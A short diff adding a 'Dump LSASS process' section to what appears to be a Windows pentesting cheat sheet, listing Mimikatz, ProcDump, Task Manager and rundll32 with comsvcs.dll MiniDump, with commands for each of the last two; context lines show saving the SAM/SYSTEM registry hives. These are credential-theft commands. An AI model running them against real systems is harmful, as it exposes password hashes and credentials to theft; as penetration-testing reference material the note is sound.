@@ -118,6 +118,21 @@ $ w32tm /query /status
 [Release Informations](https://docs.microsoft.com/fr-fr/windows/release-information/)
 
 
+### Dump LSASS process
+
+There is various methods to dump the `lsass` process memory:
+
+- Mimikatz
+- [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
+- TaskManager
+- Rundll32
+
+
+```bash
+$ procdump -accepteula -ma lsass.exe lsass.dmp
+$ Powershell -c rundll32.exe "C:\Windows\System32\comsvcs.dll", MiniDump [process ID of lsass.exe] dump.bin full
+```
+
 ### SAM and SYSTEM backup
 ```bash
 $ reg save HKLM\SYSTEM SystemBkup.hiv
